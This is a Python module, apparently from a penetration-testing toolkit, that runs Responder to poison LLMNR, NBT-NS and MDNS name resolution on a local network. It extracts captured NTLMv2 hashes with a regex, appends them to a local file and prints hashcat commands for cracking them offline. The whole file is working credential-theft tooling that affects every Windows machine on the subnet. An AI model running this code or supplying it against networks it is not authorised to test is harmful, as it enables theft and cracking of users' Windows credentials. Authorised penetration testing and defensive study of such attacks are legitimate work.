"""
Responder integration for LLMNR/NBT-NS/MDNS poisoning → NTLM hash capture.

Responder answers broadcast name resolution queries (LLMNR, NBT-NS, MDNS)
with the attacker's IP, causing Windows machines to authenticate and reveal
NTLMv2 hashes. These hashes can be cracked offline with hashcat (-m 5600).

Also integrates mitm6 for IPv6-based NTLM relay attacks.
"""

import os
import re
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Responder (NTLM Hash Capture)",
    description=(
        "Poisons LLMNR/NBT-NS/MDNS broadcasts on the LAN to intercept "
        "Windows authentication requests. Captures NTLMv2 hashes passively. "
        "Auto-saves hashes for hashcat cracking (mode 5600)."
    ),
    usage="Run on the network interface. Passive mode only — no active exploitation.",
    danger_note="🔴 High Risk — affects all Windows machines on the subnet that broadcast name queries.",
    example="responder -I eth0 -rdw",
)

DANGER = DangerLevel.RED

HASH_FILE = os.path.expanduser("~/penkit-captures/responder_hashes.txt")


class ResponderEngine:
    def __init__(self, interface: str = "eth0"):
        self.interface = interface
        self._runner = CommandRunner()
        self._hashes: list[str] = []

    async def capture(
        self,
        wpad: bool = True,
        dhcp: bool = False,
    ) -> AsyncGenerator[str, None]:
        os.makedirs(os.path.dirname(HASH_FILE), exist_ok=True)

        yield f"[*] Responder starting on {self.interface}"
        yield "[*] Poisoning: LLMNR, NBT-NS, MDNS"
        yield f"[*] Hashes saved to: {HASH_FILE}"
        yield "[*] Crack with: hashcat -m 5600 hashes.txt rockyou.txt"
        yield ""

        cmd = ["responder", "-I", self.interface, "-r", "-d", "-v"]
        if wpad:
            cmd.append("-w")
        if dhcp:
            cmd.append("--dhcp")

        async for line in self._runner.run(cmd):
            # Detect NTLMv2 hash lines
            if "NTLMv2-SSP Hash" in line or "NTLMv2 Hash" in line:
                # Extract hash
                m = re.search(r'([\w.-]+::[^:]+:[A-Fa-f0-9]+:[A-Fa-f0-9]+:[A-Fa-f0-9]+)', line)
                if m:
                    h = m.group(1)
                    self._hashes.append(h)
                    with open(HASH_FILE, "a") as f:
                        f.write(h + "\n")
                    yield f"\n[+] NTLMv2 HASH CAPTURED:"
                    yield f"    {h}"
                    yield f"[*] Crack: hashcat -m 5600 {HASH_FILE} /usr/share/wordlists/rockyou.txt\n"
                else:
                    yield f"[HASH] {line.strip()}"
            elif "[*]" in line or "[+]" in line or "Poisoned" in line:
                yield f"[*] {line.strip()}"
            elif line.strip():
                yield line

    async def stop(self):
        await self._runner.stop()

    def get_hashes(self) -> list[str]:
        return self._hashes
